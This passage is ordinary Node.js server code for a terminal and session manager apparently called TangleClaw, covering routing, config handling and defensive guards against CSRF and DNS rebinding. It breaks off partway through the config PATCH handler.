'use strict';

const http = require('node:http');
const https = require('node:https');
const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

// node:sqlite (used by lib/store.js, required just below) needs Node 22+. Fail
// fast with a clear message instead of a cryptic "Cannot find module
// 'node:sqlite'" on an older runtime.
const _nodeMajor = Number(process.versions.node.split('.')[0]);
if (Number.isFinite(_nodeMajor) && _nodeMajor < 22) {
  console.error(`TangleClaw requires Node.js 22+ (node:sqlite); detected ${process.versions.node}.`);
  process.exit(1);
}

const { createLogger, setLevel, initFileLogging } = require('./lib/logger');
const store = require('./lib/store');
const system = require('./lib/system');
const engines = require('./lib/engines');
const gitHooks = require('./lib/git-hooks');
const gitTemplate = require('./lib/git-template');
const tmux = require('./lib/tmux');
const projects = require('./lib/projects');
const sessions = require('./lib/sessions');
const master = require('./lib/master');
const actions = require('./lib/actions');
const porthub = require('./lib/porthub');
const uploads = require('./lib/uploads');
const continuity = require('./lib/continuity');
const tunnel = require('./lib/tunnel');
const portScanner = require('./lib/port-scanner');
const modelStatus = require('./lib/model-status');
const updateChecker = require('./lib/update-checker');
const updateApplier = require('./lib/update-applier');
const serverInfo = require('./lib/server-info');
const bindPolicy = require('./lib/bind-policy');
const wrapRunRegistry = require('./lib/wrap-run-registry');
const wrapDefaultPipeline = require('./lib/wrap-default-pipeline');
const evalAudit = require('./lib/eval-audit');
const pidfile = require('./lib/pidfile');
const sidecar = require('./lib/sidecar');
const openclawVersion = require('./lib/openclaw-version');
const openclawDetect = require('./lib/openclaw-detect');
const tunnelMonitor = require('./lib/tunnel-monitor');
const net = require('node:net');
const httpsSetup = require('./lib/https-setup');
const caddy = require('./lib/caddy');
const ingressProvision = require('./lib/ingress-provision');
const adminCredential = require('./lib/admin-credential');
const ttydWatcher = require('./lib/ttyd-watcher');
const ttydAttach = require('./lib/ttyd-attach');
const ttydBind = require('./lib/ttyd-bind');
const wrapSentinel = require('./lib/wrap-sentinel');
const medusaWake = require('./lib/medusa-wake');
const authIdentity = require('./lib/auth-identity');
const serviceToken = require('./lib/service-token');
const medusa = require('./lib/medusa');

const log = createLogger('server');

const MAX_BODY_SIZE = 10 * 1024; // 10 KB

// Methods that can change server state, and so must not be accepted from a page
// on another site. GET/HEAD are excluded because they are the ones a browser
// issues while merely navigating; any route that mutates behind a GET is a bug
// in that route, not something to paper over here.
const CSRF_UNSAFE_METHODS = new Set(['POST', 'PUT', 'PATCH', 'DELETE']);

/**
 * Load config, or `null` if it cannot be read. Both Host-guard callers fail
 * closed on `null` rather than letting a corrupt config throw out of a request.
 * @returns {object|null}
 */
function _loadConfigOrNull() {
  try { return store.config.load(); } catch { return null; }
}

let _servedHostsCache = null;

/**
 * The served-name allowlist, or an empty set if it cannot be computed.
 *
 * **Cached, because computing it reads and X.509-parses the certificate.** This
 * runs on every guarded write and every WebSocket upgrade, and an uncached
 * version did a synchronous file read plus a certificate parse per request —
 * and, on an install with no certificate yet, emitted a warning about
 * regeneration on each one, loudest during the setup wizard, about an operation
 * the request path is not performing. Caching removes the per-request cost and
 * reduces that warning to once per change of state, which is what it was
 * written to report.
 *
 * The key is every input the answer depends on: the two configured names, the
 * machine's hostname, and the certificate's own mtime and size.
 *
 * The certificate term is the load-bearing one. `POST /api/setup/generate-cert`
 * accepts a host list that lands in no config field, so the cert is those names'
 * only record — key on the config alone and a freshly added SAN never enters the
 * allowlist for the life of the process, producing exactly the "loads over a
 * valid certificate, serves reads, refuses every write, kills every terminal
 * upgrade" failure this list exists to prevent. A test rewrites the cert between
 * two guarded requests to hold that.
 *
 * `os.hostname()` is in the key because both `certHostUnion` and
 * `servedHostAllowlist` derive names from it; without it a machine renamed
 * mid-run keeps answering to its old `.local` name until something else moves.
 *
 * An unreadable or malformed cert must not take a request down with it, so
 * failure yields an empty set: names all refused, while an IP-literal `Host`
 * still passes inside `_hostIsAllowed` on reasoning that does not consult this
 * list at all.
 *
 * @param {object} config - Loaded config.
 * @returns {Set<string>}
 */
function _servedHostsOrEmpty(config) {
  let certStamp = 'none';
  try {
    const st = fs.statSync(path.join(httpsSetup.getCertsDir(), 'cert.pem'));
    certStamp = `${st.mtimeMs}:${st.size}`;
  } catch { /* no cert yet — a real state, and a stable cache key for it */ }

  const key = `${config.publicDomain || ''}|${config.caddyTailnetHost || ''}`
    + `|${os.hostname()}|${certStamp}`;
  if (_servedHostsCache && _servedHostsCache.key === key) return _servedHostsCache.value;

  let value;
  try {
    value = httpsSetup.servedHostAllowlist(config);
  } catch (err) {
    log.warn('Could not compute the served-host allowlist; refusing named hosts', {
      error: err.message
    });
    value = new Set();
  }
  _servedHostsCache = { key, value };
  return value;
}

/**
 * Is this a first-run setup request the Host allowlist genuinely cannot cover?
 *
 * Setup is what *configures* `publicDomain` / `caddyTailnetHost`, so on an
 * install a remote operator can actually reach, first run is the one moment the
 * allowlist cannot contain the address they arrived by — the `Host` header is
 * how the install learns it, and the wizard names that address back so the
 * operator knows where the gate will appear.
 *
 * **Bounded on three axes, and the third is the one that matters.** An earlier
 * version stopped at "a setup route, before `setupComplete`", reasoning that a
 * fresh install is unprotected anyway. That reasoning was wrong: the default
 * config is `bindAllInterfaces: false` with `ingressMode: 'direct'`, so the
 * default install binds loopback only and **no remote operator can reach the
 * wizard at all**. On that population the exemption protected no real flow, and
 * the only request that could arrive at a setup route under an unserved `Host`
 * was the rebound one — handing back exactly the attack this guard closes, on
 * the route that sets the admin credential.
 *
 * So the carve-out applies only where the flow it exists for is possible: the
 * socket is actually wide. A loopback-only install gets no exemption, because it
 * has no remote first run to protect — and neither does caddy mode, which reads
 * like a second qualifier and is not (see the reasoning at the return below).
 *
 * @param {string} pathname - Request path.
 * @param {object|null} config - Loaded config, or `null` when it could not be
 *   read. `null` denies the exemption — it is never re-read here, because the
 *   caller loads it once and shares it with the allowlist check.
 * @returns {boolean}
 */
function _setupRouteNeedingHostExemption(pathname, config) {
  // `/api/config` is here because the wizard has TWO terminators: Finish posts
  // `/api/setup/complete`, and Skip sends `PATCH /api/config { setupComplete:
  // true }` (ADR 0009 point 2). Guarding one and not the other is the
  // half-swept-family defect this repo keeps re-learning — remote Skip would
  // 403 while remote Finish worked.
  //
  // Including a general settings route looks wide until you note WHERE this can
  // apply: an install that is pre-setup and remotely reachable has no credential
  // and no gate, so anyone who can reach it can already PATCH config directly.
  // Rebinding buys an attacker nothing there that direct access does not. That
  // is precisely why the three-axis form is safe and the two-axis one was not.
  const isSetupSurface = pathname.startsWith('/api/setup/') || pathname === '/api/config';
  if (!isSetupSurface) return false;
  // A config that could not be read is not a reason to open the carve-out.
  if (!config || config.setupComplete !== false) return false;
  // Is this socket reachable from another machine at all? If not, there is no
  // remote first run, and the only request that can arrive here under an
  // unserved Host is the rebound one.
  //
  // Caddy mode is deliberately NOT a second way to qualify, though it looks like
  // one. `bindPolicy` refuses the wide opt-in in caddy mode, so the listener is
  // loopback-only there too — Caddy holds the gate in front of it. A remote
  // operator therefore reaches the wizard THROUGH Caddy, under the site name
  // Caddy serves, which this allowlist already contains; while a rebound page
  // reaches 127.0.0.1 directly, without traversing Caddy at all. Adding caddy
  // mode would have exempted only the attack — the same defect as keying on
  // `setupComplete` alone, in the other arm.
  return bindPolicy.describeBindState(config).wide === true;
}

/**
 * Is `Host` a name this install actually serves?
 *
 * The cross-site guards ask the request to vouch for itself: `Sec-Fetch-Site`
 * is what the browser computed from the page's own origin, and the upgrade
 * guard compares `Origin` to the request's own `Host`. Both are satisfied by an
 * attacker who controls DNS — `evil.example` pointed at `127.0.0.1` is
 * `same-origin` as far as the browser knows, and reaches the ungated loopback
 * listener. This is the independent check (#864).
 *
 * Parsed via `URL`, never split on `':'`: a bracketed IPv6 `Host`
 * (`[fd7a:115c::1]:3102`) splits into `'['`, and Tailscale gives every node an
 * `fd7a:115c::/48` address, so splitting would refuse a normal way to reach
 * this product. Same reasoning as `_isSameOriginUpgrade`.
 *
 * A missing `Host` is refused: HTTP/1.1 requires it, and the callers only
 * consult this for state-changing requests and upgrades.
 *
 * @param {string|undefined} host - The `Host` header.
 * @param {Set<string>} [allowlist] - Override (tests); defaults to the live config.
 * @returns {boolean}
 */
function _hostIsAllowed(host, allowlist) {
  if (!host) return false;
  let name;
  try {
    name = new URL(`http://${host}`).hostname.toLowerCase();
  } catch {
    return false;
  }
  // `URL` keeps IPv6 literals bracketed; unwrap before testing either branch.
  if (name.startsWith('[') && name.endsWith(']')) name = name.slice(1, -1);

  // An IP literal is always allowed, and this is the whole shape of the attack.
  // Rebinding needs a NAME: the trick is to make a name the browser already
  // trusts resolve somewhere else, and `Host` then carries that name. There is
  // no DNS step for a literal — a request that reaches us same-origin as
  // `192.168.1.50` or `[fd7a:115c::1]` means the browser really is talking to
  // that address. A page hosted at a DIFFERENT address posting here yields
  // `Origin` ≠ `Host`, which the two guards above already refuse.
  //
  // This also keeps the allowlist free of the machine's own interface
  // addresses, which would otherwise have to be enumerated and would change
  // with the network — a Tailscale node's `fd7a:115c::/48` address is a normal
  // way to reach this product and appears in no config field.
  if (net.isIP(name)) return true;

  const allowed = allowlist || httpsSetup.servedHostAllowlist(store.config.load());
  return allowed.has(name);
}
const CONTENT_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.webmanifest': 'application/manifest+json'
};

const PUBLIC_DIR = path.join(__dirname, 'public');

// ── Restart scheduler (overridable in tests) ──
let _scheduleRestart = () => {
  setTimeout(() => {
    log.info('Setup complete — restarting server to apply HTTPS config');
    process.exit(0);
  }, 500);
};

/**
 * Override the restart scheduler (used by tests to prevent process.exit).
 * @param {Function} fn
 */
function _setRestartScheduler(fn) {
  _scheduleRestart = fn;
}

// How setup starts the ingress cutover. A seam for the same reason the restart
// scheduler is one: the real call rewrites launchd plists and restarts this
// server. Tests replace it to assert that a cutover WOULD have been started,
// without one happening. `lib/ingress-provision.js` additionally refuses a real
// spawn from a test process, so forgetting to override fails loudly.
let _spawnCutover = (opts) => ingressProvision.spawnCutover(opts);

/**
 * Override the ingress-cutover spawner (used by tests).
 * @param {Function} fn - Receives `{ target }`, returns `{ ok, pid, error }`.
 */
function _setCutoverSpawner(fn) {
  _spawnCutover = fn;
}

// ── Route Table ──

const routes = [];

/**
 * Register a route handler.
 * @param {string} method - HTTP method
 * @param {string} pattern - URL pattern (supports :param segments)
 * @param {Function} handler - (req, res, params, body) => void
 * @param {object} [options] - Optional route config
 * @param {number} [options.maxBodySize] - Override MAX_BODY_SIZE for this route
 */
function route(method, pattern, handler, options) {
  const paramNames = [];
  const regexStr = pattern.replace(/:([^/]+)/g, (_, name) => {
    paramNames.push(name);
    return '([^/]+)';
  });
  routes.push({
    method: method.toUpperCase(),
    regex: new RegExp(`^${regexStr}$`),
    paramNames,
    handler,
    options: options || {}
  });
}

/**
 * Match a request to a route.
 * @param {string} method - HTTP method
 * @param {string} pathname - URL path
 * @returns {{ handler: Function, params: object, options: object }|null}
 */
function matchRoute(method, pathname) {
  for (const r of routes) {
    if (r.method !== method) continue;
    const match = pathname.match(r.regex);
    if (match) {
      const params = {};
      r.paramNames.forEach((name, i) => {
        params[name] = decodeURIComponent(match[i + 1]);
      });
      return { handler: r.handler, params, options: r.options || {} };
    }
  }
  return null;
}

// ── Response Helpers ──

/**
 * Send a JSON response.
 * @param {http.ServerResponse} res
 * @param {number} status - HTTP status code
 * @param {object} data - Response body
 */
function jsonResponse(res, status, data) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body)
  });
  res.end(body);
}

/**
 * Send a standard error response.
 * @param {http.ServerResponse} res
 * @param {number} status - HTTP status code
 * @param {string} message - Error message
 * @param {string} code - Machine-readable error code
 */
function errorResponse(res, status, message, code) {
  jsonResponse(res, status, { error: message, code });
}

// ── Body Parser ──

/**
 * Parse JSON request body with size limit.
 * @param {http.IncomingMessage} req
 * @param {number} [maxSize] - Override default max body size
 * @returns {Promise<object|null>}
 */
function parseBody(req, maxSize) {
  const limit = maxSize || MAX_BODY_SIZE;
  return new Promise((resolve, reject) => {
    if (req.method === 'GET' || req.method === 'HEAD') {
      return resolve(null);
    }

    const chunks = [];
    let size = 0;
    let rejected = false;

    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > limit && !rejected) {
        rejected = true;
        // Resume and discard remaining data so the response can be sent
        req.resume();
        reject({ status: 413, message: 'Request body too large', code: 'BODY_TOO_LARGE' });
        return;
      }
      if (!rejected) {
        chunks.push(chunk);
      }
    });

    req.on('end', () => {
      if (size === 0) return resolve(null);
      try {
        const raw = Buffer.concat(chunks).toString('utf8');
        resolve(JSON.parse(raw));
      } catch (err) {
        reject({ status: 400, message: 'Invalid JSON in request body', code: 'BAD_REQUEST' });
      }
    });

    req.on('error', (err) => {
      reject({ status: 500, message: err.message, code: 'INTERNAL_ERROR' });
    });
  });
}

// ── Static File Serving ──

/**
 * Serve a static file from the public directory.
 * @param {http.ServerResponse} res
 * @param {string} pathname - URL path
 * @returns {boolean} - Whether a file was served
 */
function serveStatic(res, pathname) {
  let filePath = path.join(PUBLIC_DIR, pathname);

  // Prevent path traversal
  if (!filePath.startsWith(PUBLIC_DIR)) {
    errorResponse(res, 403, 'Forbidden', 'FORBIDDEN');
    return true;
  }

  // Default to index.html
  if (pathname === '/' || pathname === '') {
    filePath = path.join(PUBLIC_DIR, 'index.html');
  }

  if (!fs.existsSync(filePath) || fs.statSync(filePath).isDirectory()) {
    return false;
  }

  const ext = path.extname(filePath).toLowerCase();
  const contentType = CONTENT_TYPES[ext] || 'application/octet-stream';
  const content = fs.readFileSync(filePath);

  res.writeHead(200, {
    'Content-Type': contentType,
    'Content-Length': content.length,
    'Cache-Control': 'no-cache'
  });
  res.end(content);
  return true;
}

// ── Parse Query String ──

/**
 * Build the request URL, tolerating an absent Host header (falls back to
 * localhost). Consolidates the repeated `new URL(req.url, ...)` idiom so the
 * localhost fallback can't drift per call site.
 * @param {http.IncomingMessage} req - Incoming request
 * @returns {URL}
 */
function reqUrl(req) {
  return new URL(req.url, `http://${req.headers.host || 'localhost'}`);
}

/**
 * Parse URL query parameters.
 * @param {string} search - Query string (e.g. '?key=value')
 * @returns {object}
 */
function parseQuery(search) {
  const params = {};
  if (!search) return params;
  const stripped = search.startsWith('?') ? search.slice(1) : search;
  for (const pair of stripped.split('&')) {
    const [key, ...rest] = pair.split('=');
    if (key) {
      params[decodeURIComponent(key)] = decodeURIComponent(rest.join('=') || '');
    }
  }
  return params;
}

// ── API Route Handlers ──

// GET /api/health
route('GET', '/api/health', (_req, res) => {
  const db = store.getDb();
  let dbStatus = 'unavailable';
  if (db) {
    try {
      db.prepare('SELECT 1').get();
      dbStatus = 'ok';
    } catch {
      dbStatus = 'unavailable';
    }
  }

  // tmux check (synchronous)
  let tmuxStatus = 'unavailable';
  try {
    require('node:child_process').execSync('tmux list-sessions 2>/dev/null', { timeout: 2000 });
    tmuxStatus = 'ok';
  } catch {
    try {
      require('node:child_process').execSync('which tmux', { timeout: 1000 });
      tmuxStatus = 'ok';
    } catch {
      tmuxStatus = 'unavailable';
    }
  }

  // ttyd check — TCP connect to configured port
  const config = store.config.load();
  const net = require('node:net');
  const socket = new net.Socket();
  socket.setTimeout(500);

  return new Promise((resolve) => {
    const respond = (ttyd) => {
      const version = _getVersion();
      const allOk = dbStatus === 'ok' && ttyd === 'ok';
      const status = dbStatus !== 'ok' ? 'degraded' : (allOk ? 'ok' : 'degraded');
      const httpStatus = dbStatus !== 'ok' ? 503 : 200;

      jsonResponse(res, httpStatus, {
        status,
        version,
        uptime: Math.floor(process.uptime()),
        services: {
          database: dbStatus,
          ttyd: ttyd,
          tmux: tmuxStatus
        }
      });
      resolve();
    };

    const ttydTarget = caddy.ttydConnectTarget(config);
    const onTtydUp = () => {
      socket.destroy();
      respond('ok');
    };
    if (ttydTarget.socketPath) {
      socket.connect(ttydTarget.socketPath, onTtydUp);
    } else {
      socket.connect(ttydTarget.port, ttydTarget.host, onTtydUp);
    }
    socket.on('error', () => {
      socket.destroy();
      respond('unavailable');
    });
    socket.on('timeout', () => {
      socket.destroy();
      respond('unavailable');
    });
  });
});

// GET /api/version
route('GET', '/api/version', (_req, res) => {
  jsonResponse(res, 200, { version: _getVersion() });
});

// GET /api/server-info — runtime-vs-disk diff (#199). Browser polls this
// (or fetches on page load) to surface a banner when the running process
// is older than the on-disk code. See `lib/server-info.js` docstring.
route('GET', '/api/server-info', (_req, res) => {
  const info = serverInfo.getServerInfo();
  const cfg = store.config.load();
  // AUTH-3: surface the proxy-authenticated user so the dashboard can show
  // "Logged in as <user>". Null unless the Caddy basic_auth gate is live (the
  // trust gate is in lib/auth-identity — a direct-mode header is never honored).
  info.currentUser = authIdentity.resolveRequestUser(_req.headers, cfg);
  // AUTH-2K9D: surface whether the configured auth gate is actually enforcing, so
  // the dashboard can warn on a config-vs-live mismatch ('configured-inert' in
  // direct mode, 'configured-no-identity' when caddy is up but no identity
  // arrives). Surfacing only — never enforces. See docs/auth-status-surfacing.md.
  info.authStatus = authIdentity.resolveAuthStatus(_req.headers, cfg);
  jsonResponse(res, 200, info);
});

// ── Project Master (chunk G, #331) ──
// Operator routes for the global read-only assistant — a reserved tmux
// session, NOT a sessions-table row (see lib/master.js). Deliberately outside
// the M2M-gated path set: these are operator surfaces, not fleet surfaces.

// GET /api/master/status — is the master session alive? Truth from tmux.
route('GET', '/api/master/status', (_req, res) => {
  jsonResponse(res, 200, master.getMasterStatus());
});

// POST /api/master/ensure — idempotent create-or-noop. Regenerates the
// master's CLAUDE.md identity every call (so guide/token changes propagate),
// launches the session only when absent. The UI calls this before attaching
// the terminal iframe (ttyd only attaches to EXISTING tmux sessions).
route('POST', '/api/master/ensure', (_req, res) => {
  const result = master.ensureMasterSession();
  if (result.error) {
    return errorResponse(res, 500, result.error, 'MASTER_ENSURE_FAILED');
  }
  jsonResponse(res, 200, result);
});

// POST /api/master/rules/restore-defaults — replace every master Hard rule
// with the shipped baseline (the recovery path if an edit ever weakened the
// boundary). History survives in session_rule_versions. A live master picks
// the change up on the next ensure (identity regeneration).
route('POST', '/api/master/rules/restore-defaults', (_req, res) => {
  const rules = master.restoreDefaultMasterRules();
  jsonResponse(res, 200, { ok: true, rules });
});

// POST /api/server/restart — kick the TC server via the platform's
// process manager (#235). 202 Accepted is sent BEFORE the exec so the
// browser sees a clean response, then ~80ms later the launchctl
// kickstart kills this process. The browser polls /api/server-info to
// detect when the new process is up and reloads. Returns 501 when no
// restart mechanism is available (e.g. bare-node, Linux today) so the
// frontend can hide the button cleanly.
route('POST', '/api/server/restart', (_req, res, _params, body) => {
  // #583 — a restart kills any in-flight wrap pipeline (the 2026-07-16
  // incident's first domino: a restart POSTed mid-wrap 502'd the wrap and
  // orphaned its content steps). Refuse while a wrap runs unless the
  // operator explicitly forces past the guard. Checked BEFORE mechanism
  // detection so the refusal path can never schedule an exec.
  const wrappingProject = wrapRunRegistry.anyRunning();
  if (wrappingProject && !(body && body.force === true)) {
    return errorResponse(res, 409,
      `A session wrap is running for "${wrappingProject}" — restarting now would kill it mid-pipeline. ` +
      'Wait for it to finish (GET /api/sessions/:project/wrap/status), or retry with {"force": true}.',
      'WRAP_RESTART_BLOCKED');
  }
  const mechanism = serverInfo.detectRestartMechanism();
  if (!mechanism) {
    jsonResponse(res, 501, {
      ok: false,
      error: 'no restart mechanism available on this host (macOS launchd plist not detected; Linux support is a follow-up)'
    });
    return;
  }
  const command = serverInfo.buildRestartCommand(mechanism);
  if (!command) {
    // Defensive: detectRestartMechanism returned non-null but
    // buildRestartCommand didn't recognize it. Bug, not user error.
    jsonResponse(res, 500, {
      ok: false,
      error: `internal: no command builder for mechanism "${mechanism}"`
    });
    return;
  }
  jsonResponse(res, 202, {
    ok: true,
    mechanism,
    detail: 'restart scheduled; poll /api/server-info to detect when the new process is up'
  });
  // Delay so the response actually drains through the network before
  // `launchctl kickstart -k` SIGKILLs us. SIGKILL closes sockets with
  // RST (not FIN) on macOS, so any bytes still in the kernel TX buffer
  // are dropped without delivery. On localhost the handover is
  // sub-millisecond; on a Cloudflare tunnel to a remote browser
  // (the common setup: operator on a second machine, TangleClaw on the host)
  // RTT can be 50-150ms, so the 202 response needs a margin past the
  // pure kernel-flush time. 300ms covers typical tunnel RTT plus
  // queue/processing slack without being noticeably slow to the
  // operator (the dialog closes, then ~300ms later polling begins —
  // visually instantaneous). Bumped from 80ms after Critic-flagged
  // remote-truncation risk on #235.
  setTimeout(() => {
    try {
      require('node:child_process').execSync(command, { stdio: ['ignore', 'ignore', 'ignore'], timeout: 5000 });
    } catch (err) {
      // We're about to be killed anyway; log for the next process to
      // notice on tail, but don't crash before SIGKILL arrives.
      // eslint-disable-next-line no-console
      console.error('[server-restart] exec failed:', err && err.message);
    }
  }, 300);
});

// GET /api/config
/**
 * Strip credential material from a config object before it leaves the server.
 * `deletePassword` (scrypt) and `basicAuthHash` (bcrypt) are stored hashes, and
 * `serviceToken` (AUTH-4) is a raw bearer secret — none of them need to reach a
 * client (the hashes are offline-cracking targets; the token is a live
 * credential), the UI only needs to know whether each is set. Returns a shallow
 * copy with each secret removed and a `*Protected`/`*Configured` boolean in its
 * place.
 * @param {object} config
 * @returns {object}
 */
function redactConfigSecrets(config) {
  const redacted = { ...config };
  redacted.deleteProtected = !!redacted.deletePassword;
  delete redacted.deletePassword;
  redacted.basicAuthConfigured = !!redacted.basicAuthHash;
  delete redacted.basicAuthHash;
  // AUTH-4 — the raw fleet token never leaves via the config API; surface only
  // whether one is set. It is revealed through the dedicated reveal endpoint.
  redacted.serviceTokenConfigured = !!redacted.serviceToken;
  delete redacted.serviceToken;
  return redacted;
}

route('GET', '/api/config', (_req, res) => {
  const config = store.config.load();
  jsonResponse(res, 200, _withBindState(config));
});

/**
 * Attach the server-resolved network-binding state to a config response.
 *
 * The settings UI renders a control whose meaning depends on rules the SERVER
 * owns — caddy mode overriding an opt-in, an unchosen install held deliberately
 * wide. Every time the frontend re-derived those rules from the raw fields it
 * drifted, and the drift was always a control that misdescribed the socket. So
 * the server ships its own answer and the UI renders it.
 * @param {object} config - Full config.
 * @returns {object} Redacted config plus a `bindState` block.
 */
function _withBindState(config) {
  // Classify from the MIGRATED view. `load()` merges DEFAULT_CONFIG's `false`,
  // so an install whose boot-time persist failed — the contingency boot itself
  // tolerates as non-fatal — would otherwise be reported as "closed" while its
  // socket is wide, and the settings modal would draw a shut door over an open
  // one and hide the way out. In-memory only: a GET must not write.
  bindPolicy.migrateLegacyBind(config, store.config.isKeyPersisted(bindPolicy.OPT_IN_KEY));
  return {
    ...redactConfigSecrets(config),
    bindState: bindPolicy.describeBindState(config),
    protectedRoots: _protectedRoots()
  };
}

/**
 * Directories THIS machine's OS keeps a background service out of, in both the
 * `~` form an operator types and the absolute form a path resolves to.
 *
 * Ships from the server for the same reason `bindState` does: the browser cannot
 * answer it. The question is what the OS running TangleClaw protects, and the
 * browser asking it may be a phone — `navigator.platform` would say iOS about a
 * Mac, and the one warning that matters would never appear. It is also the wrong
 * question to hardcode in the UI: `~/Documents` means nothing on the Linux hosts
 * TangleClaw also runs on, and a caution that fires there is a caution people
 * learn to ignore.
 *
 * Empty on every platform without this behaviour, so callers can treat "no roots"
 * as "nothing to warn about" rather than special-casing macOS themselves.
 *
 * @returns {string[]} Protected directory roots, or `[]` where none apply.
 */
function _protectedRoots() {
  // macOS TCC. A launchd-spawned process gets no prompt and no EPERM here — the
  // read simply never returns (#859), which is why this is worth saying BEFORE
  // someone points the product at one of them rather than only after.
  if (process.platform !== 'darwin') return [];
  const home = process.env.HOME || '';
  const roots = [];
  for (const name of ['Documents', 'Desktop', 'Downloads']) {
    roots.push(`~/${name}`);
    if (home) roots.push(path.join(home, name));
  }
  return roots;
}

/**
 * Validate a PATCHed `master` settings object (the Project Master surface).
 * Merges the patch onto the current effective settings first, so a partial
 * object never wipes fields (the config-file merge is shallow), then
 * validates the full shape. Access levels beyond the enabled set are rejected
 * with an honest reason — a tier ships only WITH its structural enforcement,
 * never as a prose-only boundary.
 * @param {*} patch - The PATCH body's `master` value
 * @param {object} config - Current full config
 * @returns {{value?: object, error?: string}}
 */
function validateMasterPatch(patch, config) {
  if (!patch || typeof patch !== 'object' || Array.isArray(patch)) {
    return { error: 'master must be an object' };
  }
  const known = ['accessLevel', 'engine', 'scope', 'autoStart'];
  for (const key of Object.keys(patch)) {
    if (!known.includes(key)) return { error: `master.${key} is not a settable field` };
  }
  const merged = { ...master.masterSettings(config), ...patch };
  if (!master.MASTER_ACCESS_LEVELS.includes(merged.accessLevel)) {
    return { error: `master.accessLevel must be one of: ${master.MASTER_ACCESS_LEVELS.join(', ')}` };
  }
  if (!master.MASTER_ENABLED_ACCESS_LEVELS.includes(merged.accessLevel)) {
    return { error: `master.accessLevel "${merged.accessLevel}" is not available yet — it ships only with real structural enforcement (currently enabled: ${master.MASTER_ENABLED_ACCESS_LEVELS.join(', ')})` };
  }
  if (merged.engine !== null) {
    if (typeof merged.engine !== 'string' || !merged.engine) {
      return { error: 'master.engine must be an engine id string or null' };
    }
    if (!store.engines.get(merged.engine)) {
      return { error: `master.engine "${merged.engine}" is not a configured engine` };
    }
  }
  if (merged.scope !== 'all') {
    const s = merged.scope;
    if (!s || typeof s !== 'object' || s.type !== 'group' || !s.groupId || typeof s.groupId !== 'string') {
      return { error: "master.scope must be 'all' or { type: 'group', groupId }" };
    }
    if (!store.projectGroups.get(s.groupId)) {
      return { error: `master.scope group "${s.groupId}" does not exist` };
    }
    merged.scope = { type: 'group', groupId: s.groupId };
  }
  if (typeof merged.autoStart !== 'boolean') {
    return { error: 'master.autoStart must be a boolean' };
  }
  return { value: { accessLevel: merged.accessLevel, engine: merged.engine, scope: merged.scope, autoStart: merged.autoStart } };
}

// PATCH /api/config
route('PATCH', '/api/config', async (_req, res, _params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }

  const config = store.config.load();
  // Re-assert the legacy grace state before this handler saves anything. Boot
  // normally records it, but if that write failed (read-only disk, permissions)
  // the key is still absent here — and since `load()` merges the default, saving
  // would silently persist `false` and narrow a remote operator's install on
  // their next restart, without them choosing. Idempotent: a no-op once recorded.
  bindPolicy.migrateLegacyBind(config, store.config.isKeyPersisted(bindPolicy.OPT_IN_KEY));
  // Snapshot of pre-mutation values for fields whose downstream effects
  // are conditional on whether the value actually changed (#247 hardening
  // — saveGlobalSettings POSTs the field on every Save click, so unrelated
  // UI saves were triggering an N-project filesystem walk).
  const oldStripAiCoauthors = config.stripAiCoauthors;
  // Whether setup was still OPEN when this request arrived. Captured here
  // because the loop below writes `body.setupComplete` straight onto `config` —
  // read it afterwards and every request looks like an install that was already
  // finished, which is exactly how a first-run-only gate becomes a gate that
  // never fires.
  const wasSetupOpen = config.setupComplete === false;
  const allowedFields = [
    'serverPort', 'ttydPort', 'defaultEngine',
    'projectsDir', 'deletePassword', 'quickCommands', 'theme',
    'chimeEnabled', 'chimeMuted', 'peekMode', 'setupComplete',
    'portScannerEnabled', 'portScannerIntervalMs',
    'httpsEnabled', 'httpsCertPath', 'httpsKeyPath',
    'stripAiCoauthors', 'ingressMode', 'publicDomain', 'bindAllInterfaces',
    'caddyHttpsPort', 'caddyHttpPort',
    // authEnabled / basicAuthUser / basicAuthHash are deliberately ABSENT. This
    // route authenticates nobody, validated only the SHAPE of a hash, and had no
    // lifecycle gate — so on an ungated, network-reachable install an
    // unauthenticated caller could set an admin credential of their choosing and
    // lock the owner out. Credential changes go through POST /api/auth/credential,
    // which refuses unless a live gate is already authenticating the request.
    'serviceTokenEnabled', 'wrapDisabled', 'master'
  ];

  // Refuse rather than ignore. Unknown keys below are silently skipped by design,
  // which is right for a field this route never owned — but these three it DID
  // own until now, so a caller still sending them would get 200 and no change,
  // and "your password is updated" when it is not is the exact false report this
  // work exists to end.
  const CREDENTIAL_FIELDS = ['authEnabled', 'basicAuthUser', 'basicAuthHash'];
  const sentCredential = CREDENTIAL_FIELDS.filter((k) => k in body);
  if (sentCredential.length > 0) {
    return errorResponse(res, 409,
      `${sentCredential.join(', ')} cannot be set here. Change the login from settings, `
      + 'which uses POST /api/auth/credential, or run `node scripts/reset-admin.js` at a terminal.',
      'CREDENTIAL_ROUTE_MOVED');
  }

  const validThemes = ['dark', 'light', 'high-contrast'];
  const validPeekModes = ['drawer', 'modal', 'alert'];
  const validIngressModes = ['direct', 'caddy'];

  let requiresRestart = false;

  for (const [key, value] of Object.entries(body)) {
    if (!allowedFields.includes(key)) continue;

    // Project Master settings — merge-then-validate as one object (partial
    // patches never wipe fields), stored whole. Handled before the generic
    // scalar validations because the normalized value replaces the raw one.
    if (key === 'master') {
      const check = validateMasterPatch(value, config);
      if (check.error) return errorResponse(res, 400, check.error, 'BAD_REQUEST');
      config.master = check.value;
      continue;
    }

    // Validate specific fields
    if ((key === 'serverPort' || key === 'ttydPort') && typeof value !== 'number') {
      return errorResponse(res, 400, `${key} must be a number`, 'BAD_REQUEST');
    }
    if (key === 'theme' && !validThemes.includes(value)) {
      return errorResponse(res, 400, `theme must be one of: ${validThemes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'peekMode' && !validPeekModes.includes(value)) {
      return errorResponse(res, 400, `peekMode must be one of: ${validPeekModes.join(', ')}`, 'BAD_REQUEST');
    }
    if (key === 'setupComplete' && typeof value !== 'boolean') {
      return errorResponse(res, 400, 'setupComplete must be a boolean', 'BAD_REQUEST');
    }
